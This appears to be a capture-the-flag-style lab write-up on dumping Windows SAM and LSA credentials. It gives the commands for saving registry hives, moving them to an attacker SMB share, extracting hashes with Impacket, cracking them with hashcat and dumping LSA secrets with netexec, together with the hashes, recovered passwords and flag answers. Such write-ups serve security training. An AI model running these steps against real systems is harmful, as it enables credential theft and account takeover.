### SAM/LSA Credential Dumping Exercise

IP: 10.129.202.137

---

### Question 1:
Where is the SAM database located in the Windows registry? (Format: ****\***)

&#x1F6A9; found **HKLM\SAM**.

---

### Question 2:
Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

I start off by using the credentials to RDP into the target machine using xfreerdp.

```diff
+ $ xfreerdp /u:bob /p:HTB_@cademy_stdnt! /v:10.129.202.137
```

From there I open cmd.exe as administrator, then run reg.exe to make saves of the SAM, SYSTEM, and SECURITY files.

```diff
+ C:\> reg.exe save hklm\sam C:\sam.save
+ C:\> reg.exe save hklm\system C:\system.save
+ C:\> reg.exe save hklm\security C:\security.save
```

Afterwards I use smbserver.py from Impacket on my local machine so I can transfer the files.

```diff
+ $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Then on the remote machine.

```diff
+ C:\> move sam.save \\10.10.14.42\CompData
+ C:\> move security.save \\10.10.14.42\CompData
+ C:\> move system.save \\10.10.14.42\CompData
```

Once that's finished, I dump the hashes locally using secretsdump.py from Impacket.

```diff
+ $ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
	bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
	jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
	ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
	frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

Next I copy the NTLM hashes into a file and use hashcat to crack them.

```diff
+ $ sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

	a3ecf31e65208382e23b3420a34208fc:mommy1
	c02478537b9727d391bc80011c2e2321:matrix
	31d6cfe0d16ae931b73c59d7e0c089c0:
	58a478135a93ac3bf058a5ea0e8fdb71:Password123

From this I can see that the ITbackdoor account's password is matrix.

&#x1F6A9; found **matrix**.

---

### Question 3:
Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

Finally, I use netexec to dump LSA hashes with the account that has local administrator access, bob.

```diff
+ $ netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

	SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:None)
	SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
	SMB         10.129.202.137  445    FRONTDESK01      [*] Dumping LSA secrets
	SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
	dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
	SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123

From this I can see the account and password.

&#x1F6A9; found **frontdesk:Password123**.
